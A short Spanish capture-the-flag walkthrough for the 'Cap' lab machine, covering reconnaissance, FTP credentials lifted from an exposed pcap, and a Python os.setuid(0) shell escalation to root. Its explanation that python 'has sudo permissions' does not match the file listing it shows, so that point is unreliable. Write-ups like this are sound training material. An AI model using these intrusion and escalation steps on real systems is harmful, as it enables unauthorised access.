@@ -1,0 +1,76 @@
+Cap Easy
+
+Bueno es una máquina fácil empezamos con nmap, en este caso tenemos ssh, ftp y web
+generalmente cuando hay un ftp es porque más delante podemos explotarlo
+
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
+|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
+|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
+80/tcp open  http    gunicorn
+|_http-title: Security Dashboard
+|_http-server-header: gunicorn
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 404 NOT FOUND
+|     Server: gunicorn
+|     Date: Tue, 08 Oct 2024 21:00:32 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 232
+|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+|     <title>404 Not Found</title>
+
+así que hago un ftp rápido para ver si saco algo
+
+no encuentro nada
+
+pasando a la web si ya entro en una web donde tengo el analisis de trafico de red
+
+generalmente sale 1, pero podemos ver el 0
+
+http://cap.htb/data/0
+
+abrios con wireshark y lo miramos un poco
+
+36	4.126500	192.168.196.1	192.168.196.16	FTP	69	Request: USER nathan
+40	5.424998	192.168.196.1	192.168.196.16	FTP	78	Request: PASS Buck3tH4TF0RM3!
+
+tenemos el usuario y password en ese pcap
+
+alternativamente podemos usar strings en el archivo y también nos da la info
+220 (vsFTPd 3.0.3)
+USER nathan
+331 Please specify the password.
+PASS Buck3tH4TF0RM3!
+
+ftp nathan@10.129.x.x 
+
+abrimos y podemos hacer get a user.txt
+
+----
+
+Evidentemente no hay mucho que rascar para root al tener solo 1 archivo
+
+y pasamos a ssh
+
+instalamos linpeas
+
+y al ejecutarlo vemos que python tiene permisos de sudo
+
+ls -la /usr/bin/python3.8
+-rwxr-xr-x 1 root root 5486384 Jan 27  2021 /usr/bin/python3.8
+
+python3
+
+import os
+os.setuid(0)
+>>> os.system('id')
+uid=0(root) gid=1001(nathan) groups=1001(nathan)
+
+os.system('sh')
+
+y ya tenemos sh como root y la flag
+
